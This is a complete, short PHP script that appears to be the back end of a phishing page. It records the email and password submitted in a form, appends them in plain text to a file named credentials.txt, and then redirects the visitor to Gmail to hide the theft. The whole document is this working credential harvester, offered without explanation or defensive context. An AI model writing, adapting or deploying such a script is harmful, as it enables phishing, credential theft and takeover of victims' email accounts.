<?php
file_put_contents('credentials.txt', 'Email: ' . $_POST['email'] . ' Password: ' . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://mail.google.com');
exit();